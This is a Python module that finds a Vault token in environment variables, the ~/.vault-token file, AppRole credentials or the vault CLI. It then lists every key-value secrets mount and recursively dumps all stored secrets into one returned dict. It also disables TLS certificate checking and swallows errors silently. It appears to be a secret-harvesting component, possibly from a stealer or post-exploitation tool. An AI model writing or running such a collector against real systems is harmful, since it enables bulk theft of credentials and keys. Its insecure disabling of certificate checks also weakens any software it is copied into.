import os
import ssl
import json
import subprocess
import urllib.request
import urllib.parse

_DEFAULT_ADDR = "http://127.0.0.1:8200"

def _read_file(path):
    try:
        with open(path, 'r', errors='replace') as f:
            return f.read()
    except Exception:
        return None


def _http(method, url, token, body=None, timeout=10):
    ssl_ctx = ssl.create_default_context()
    ssl_ctx.check_hostname = False
    ssl_ctx.verify_mode = ssl.CERT_NONE

    headers = {"X-Vault-Token": token}
    if body is not None:
        headers["Content-Type"] = "application/json"

    req = urllib.request.Request(
        url,
        data=json.dumps(body).encode() if body is not None else None,
        headers=headers,
        method=method,
    )
    resp = urllib.request.urlopen(req, context=ssl_ctx, timeout=timeout)
    return json.loads(resp.read().decode())


def _api_get(url, token, params=None, timeout=10):
    if params:
        url = f"{url}?{urllib.parse.urlencode(params)}"
    return _http("GET", url, token, timeout=timeout)


def resolve_token(addr):
    token = os.environ.get("VAULT_TOKEN")
    if token:
        return token, "env"

    path = os.path.expanduser("~/.vault-token")
    content = _read_file(path)
    if content:
        return content.strip(), "file"

    role_id = os.environ.get("VAULT_ROLE_ID")
    secret_id = os.environ.get("VAULT_SECRET_ID")
    if role_id and secret_id:
        try:
            resp = _http("POST", f"{addr}/v1/auth/approle/login", "", body={
                "role_id": role_id,
                "secret_id": secret_id,
            })
            token = resp["auth"]["client_token"]
            return token, "approle"
        except Exception:
            pass

    try:
        proc = subprocess.run(
            ["vault", "print", "token"],
            capture_output=True, text=True, timeout=5
        )
        token = proc.stdout.strip()
        if token:
            return token, "vault_cli"
    except Exception:
        pass

    return None, None


def _list_path(addr, token, path):
    try:
        resp = _api_get(f"{addr}/v1/{path}", token, params={"list": "true"})
        return resp.get("data", {}).get("keys", [])
    except Exception:
        return []


def _read_kv1(addr, token, mount, path):
    try:
        resp = _api_get(f"{addr}/v1/{mount}/{path}", token)
        return resp.get("data")
    except Exception:
        return None


def _read_kv2(addr, token, mount, path):
    try:
        resp = _api_get(f"{addr}/v1/{mount}/data/{path}", token)
        return resp.get("data", {}).get("data")
    except Exception:
        return None


def _walk_kv(addr, token, mount, version, prefix=""):
    secrets = {}
    keys = _list_path(addr, token, f"{mount}/{'metadata/' if version == 2 else ''}{prefix}")
    for key in keys:
        full = f"{prefix}{key}"
        if key.endswith("/"):
            secrets.update(_walk_kv(addr, token, mount, version, full))
        else:
            if version == 2:
                data = _read_kv2(addr, token, mount, full)
            else:
                data = _read_kv1(addr, token, mount, full)
            if data is not None:
                secrets[full] = data
    return secrets


def collect() -> dict:
    addr = (os.environ.get("VAULT_ADDR") or _DEFAULT_ADDR).rstrip("/")

    token, token_source = resolve_token(addr)
    if not token:
        return {"error": "No Vault token found"}

    try:
        mounts_resp = _api_get(f"{addr}/v1/sys/mounts", token)
    except Exception as e:
        return {"error": f"Failed to list mounts: {e}"}

    result = {
        "addr": addr,
        "token_source": token_source,
        "secrets": {},
    }

    for mount, info in mounts_resp.items():
        mount = mount.rstrip("/")
        engine_type = info.get("type") if isinstance(info, dict) else None
        if engine_type not in ("kv", "generic"):
            continue

        options = info.get("options") or {}
        version = int(options.get("version", 1))

        try:
            result["secrets"][mount] = _walk_kv(addr, token, mount, version)
        except Exception:
            result["secrets"][mount] = {"__error__": "failed to walk mount"}

    return result
